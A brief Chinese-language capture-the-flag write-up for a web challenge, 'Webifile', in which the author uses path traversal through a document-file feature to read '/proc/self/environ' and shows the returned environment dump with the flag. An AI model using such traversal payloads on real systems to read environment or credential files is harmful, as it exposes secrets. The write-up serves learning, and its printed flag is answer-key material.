# Webifile

## 題目描述

Find the flag.

It's documented!

Author: [F4R3S](https://instagram.com/fares_almahsery)

## 解題思路

注意力驚人的同學可以看到他可以上傳檔案
也可以把檔案 file 加入到文件 document 當中
那這個之中會讀取文件，我就隨便亂試
試了幾個都失敗

```json
{
  "message": "[Errno 2] No such file or directory: '/tmp/app/../../flag.txt'"
}
```

後來決定讀環境變數，成功得到 flag

```text
../../proc/self/environ
```

```json
{
  "content": "HOSTNAME=94aaa7655377\u0000PWD=/usr/src/app\u0000PORT=8862\u0000HOME=/home/appuser\u0000FLAG=0xV01D{04bce341-d41b-4a74-8861-7d28e6116ba3}\u0000SHLVL=1\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000_=/usr/local/bin/gunicorn\u0000",
  "success": true,
  "title": "sv"
}
```

## Flag

```text
0xV01D{04bce341-d41b-4a74-8861-7d28e6116ba3}
```
